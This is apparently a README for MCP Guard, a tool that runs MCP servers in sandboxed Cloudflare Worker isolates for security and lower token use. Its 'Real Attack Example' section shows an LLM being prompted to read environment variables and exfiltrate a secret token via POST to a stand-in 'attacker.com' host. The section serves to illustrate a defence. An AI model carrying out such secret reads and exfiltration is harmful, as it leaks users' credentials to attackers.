# MCP Guard

> Use local MCP servers securely with zero-trust isolation while reducing context window token usage by up to 98%.

*⚡ This implementation is based on [Code execution with MCP: Building more efficient agents](https://www.anthropic.com/engineering/code-execution-with-mcp) by Anthropic. It uses [Wrangler](https://www.npmjs.com/package/wrangler) for local MCP isolation using [Dynamic Worker Loaders](https://blog.cloudflare.com/code-mode/) as described in [Code Mode: the better way to use MCP](https://developers.cloudflare.com/workers/runtime-apis/bindings/worker-loader/) by Cloudflare.*

[](https://opensource.org/licenses/MIT)
[](https://www.typescriptlang.org/)
[](https://nodejs.org/)

## 🛡️ How It Works: A Simple Example

```mermaid
flowchart LR
    User["👤 User"] -->|"&nbsp;&nbsp;Prompt&nbsp;&nbsp;"| LLM["🤖 LLM"]

    LLM -->|"&nbsp;&nbsp;⚠️ <b>Without MCP Guard&nbsp;&nbsp;"| WithoutGuard
    LLM -->|"&nbsp;&nbsp;✅ <b>With MCP Guard&nbsp;&nbsp;"| WithGuard

    subgraph WithoutGuard["<p style='height:6px; width: 600px;'></p>⚠️ No Code Isolation - LLM invokes MCP tools directly"]
        direction LR
        WithoutGuardWarning["MCP Can Access:<br/>⚠️ Filesystem<br/>⚠️ Env Variables<br/>⚠️ Network<br/>⚠️ System"]
        WithoutGuardWarning -->|"&nbsp;&nbsp;Direct Execution&nbsp;&nbsp;"| TargetMCPServer["MCP Tools"]
    end

    subgraph WithGuard["<p style='height:6px; width: 600px;'></p>✅ Worker Isolates Code - LLM generates code to interface with MCP tools"]
        direction LR
        WithGuardBenefits["MCP Blocked From:<br/>✅ Filesystem<br/>✅ Env Variables<br/>✅ Network<br/>✅ System"]
        WithGuardBenefits -.->|"Indirect<br/>&nbsp;&nbsp;Service Binding&nbsp;&nbsp;"| MCP["MCP Tools"] 
    end


    style WithoutGuardWarning text-align:left
    style WithGuardBenefits text-align:left
    style WithoutGuard stroke:#dd0000,stroke-width:4px
    style WithGuard stroke:#00aa00,stroke-width:4px
    style MCP stroke:#888888,stroke-width:2px
```



### Real Attack Example

**Scenario:** Malicious prompt tries to steal your secrets

**Traditional MCP:**
```
User: "Show me all environment variables"
LLM: Calls read_env() tool
Result: ⚠️ SECRET_TOKEN=xxxxxxxxxxxx exposed
LLM: Exfiltrate SECRET_TOKEN via POST to "https://attacker.com/steal"
Result: ⚠️ Fetch request succeeds
```

**With MCP Guard:**
```
User: "Show me all environment variables"
LLM: Writes code: console.log(process.env)
Result: ✅ ReferenceError: process is not defined
        Your secret stays safe
LLM: Exfiltrate SECRET_TOKEN via POST to "https://attacker.com/steal"
Result: ✅ Network access blocked
```

## 🔒 Security: Zero-Trust Execution

MCP Guard runs all code in local Cloudflare Worker isolates with **zero access** to your filesystem, environment variables, network, or system, which protects against **data exfiltration**, **credential theft**, **filesystem access**, **arbitrary code execution**, and **process manipulation**.

**Three layers of protection:**
1. **V8 Isolate Sandboxing** - Complete process isolation
2. **Network Isolation** - No outbound network access, only MCP bindings can communicate
3. **Code Validation** - Blocks dangerous patterns before execution

## ⚡ Efficiency: Code Mode Execution

Traditional MCP tool calling wastes your context window. MCP Guard uses **code mode** to reduce token usage by up to 98%.

### The Problem

When you load 10 MCPs traditionally, every tool definition loads into context **before you even start**:

```
10 MCPs × 8 tools × 250 tokens = 20,000 tokens gone
```

Then every intermediate result flows through the LLM, wasting more tokens.

### The Solution

With MCP Guard, the AI loads only what it needs and processes data in the isolate:

```typescript
// AI writes code instead of making tool calls
import * as gdrive from './servers/google-drive';
import * as salesforce from './servers/salesforce';

const doc = await gdrive.getDocument({ documentId: 'abc123' });
await salesforce.updateRecord({
  recordId: '00Q5f',
  data: { Notes: doc.content }
});
```

**Result:** Instead of 40,000 tokens, you use ~520 tokens. **98% reduction.**

**Benefits:**
- 📉 **Up to 98% reduction** in token usage
- 🚀 **60x more tasks** in the same context window
- 💰 **Massive cost savings** on LLM API calls
- ⚡ **No round-trips** for intermediate results

## 🏃 Quick Start

**Requires:** [Node.js 20+](https://nodejs.org/) installed

```bash
# Install dependencies
npm install

# Build the project
npm run build

# Start the interactive CLI
npm run cli
```

You'll see a prompt like this:

```
╔═══════════════════════════════════════════════════════════╗
║              MCP Guard - Interactive CLI                  ║
╚═══════════════════════════════════════════════════════════╝

Type "help" for available commands.
Type "exit" to quit.

mcpguard>
```

### Basic Usage

1. **Load an MCP server:**
   ```
   load
   ```
   Enter the MCP name, command (e.g., `npx`), args, and environment variables.

2. **Get the TypeScript API schema:**
   ```
   schema
   ```
   Enter the MCP ID to see available tools as TypeScript APIs.

3. **Execute code:**
   ```
   execute
   ```
   Enter the MCP ID and TypeScript code to run in the isolated Worker.

4. **List loaded MCPs:**
   ```
   list
   ```

## 📖 Available CLI Commands

| Command | Description |
|---------|-------------|
| `load` | Load an MCP server into an isolated Worker |
| `execute` | Execute TypeScript code against a loaded MCP |
| `list` | List all loaded MCP servers |
| `schema` | Get TypeScript API schema for an MCP |
| `unload` | Unload an MCP server and clean up |
| `metrics` | Show performance metrics |
| `help` | Show help message |
| `exit` | Exit the CLI |

## 🔧 Using as an MCP Server (for AI Agents)

Start the MCP server:

```bash
npm run dev
```

Configure your AI agent (Claude Desktop, Cursor IDE, etc.):

```json
{
  "mcpServers": {
    "mcpguard": {
      "command": "node",
      "args": ["/path/to/mcpguard/dist/server/index.js"]
    }
  }
}
```

**Available MCP Tools:**
- `load_mcp_server` - Load an MCP server into an isolated Worker
- `execute_code` - Execute TypeScript code in a sandboxed isolate
- `list_available_mcps` - List all loaded MCP servers
- `get_mcp_schema` - Get TypeScript API definition for a loaded MCP
- `unload_mcp_server` - Unload an MCP server
- `get_metrics` - Get performance metrics

## 🤝 Contributing

Contributions are welcome! Areas that could be enhanced:

- Real MCP protocol communication
- Real Worker Loader API integration
- Additional MCP server examples
- Performance optimizations
- Enhanced security features

## 📜 License

MIT License - see [LICENSE](./LICENSE) file for details.

## 🙏 Acknowledgments

- [Anthropic](https://www.anthropic.com/) for the Model Context Protocol
- [Cloudflare](https://www.cloudflare.com/) for Workers and the Worker Loader API
- The MCP community for building amazing MCP servers

---

**Ready to get started?** Run `npm install` and then `npm run cli` to begin! 🚀
